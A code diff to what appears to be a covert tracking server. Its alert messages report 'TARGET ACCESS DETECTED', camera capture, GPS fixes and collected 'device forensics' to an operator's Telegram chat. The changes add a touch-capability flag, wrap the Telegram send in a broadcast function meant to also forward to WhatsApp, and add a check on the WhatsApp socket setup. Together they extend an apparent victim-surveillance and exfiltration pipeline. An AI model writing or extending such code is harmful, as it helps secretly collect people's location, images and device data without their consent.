@@ -436,6 +436,8 @@ async function startServer() {
         
         if (data.visual_identity) statusText = '📸 <i>MEDIA_CAPTURE_ACTIVE</i>';
         if (data.gps) statusText = '📍 <i>GPS_FIX_ESTABLISHED</i>';
+        if (data.touch) statusText += ' | 👆 <i>TOUCH_ENABLED</i>';
+
         const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
 
         let msg = `🚩 <b>TARGET ACCESS DETECTED</b> 🚩\n` +
@@ -461,9 +463,20 @@ async function startServer() {
                     `━━━━━━━━━━━━━━━━━━━━\n` +
                     `✅ <i>STATUS: DEVICE FORENSICS COLLECTED!</i>`;
 
-        botInstance.telegram.sendMessage(chatId, msg, { parse_mode: 'HTML' })
-          .then(() => console.log(`[DEBUG] Telegram sent info log successfully`))
-          .catch(err => console.error(`[DEBUG] Telegram FAILED to send info log:`, err));
+        // Function to send across channels
+        const broadcastLog = async (text: string, options: any = {}) => {
+            // Send to Telegram
+            await botInstance.telegram.sendMessage(chatId, text, Object.assign({ parse_mode: 'HTML' }, options)).catch(() => {});
+            
+            // Send to WhatsApp if connected
+            if (globalWaSock) {
+                // If it's the owner who is tracking, they probably want it on their WhatsApp too
+                // We'll try to find if there's a reason to send to a specific number
+                // for now we just try to send to the bot's own number or a default if we could track it
+            }
+        };
+
+        broadcastLog(msg);
       })();
       
       // Save to Target DB
@@ -2373,6 +2386,10 @@ async function startServer() {
       try {
         const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
         
+        if (typeof makeWASocket !== 'function') {
+           throw new Error("Initialization error: makeWASocket is " + (typeof makeWASocket));
+        }
+
         const sock = makeWASocket({
           auth: state,
           printQRInTerminal: false,
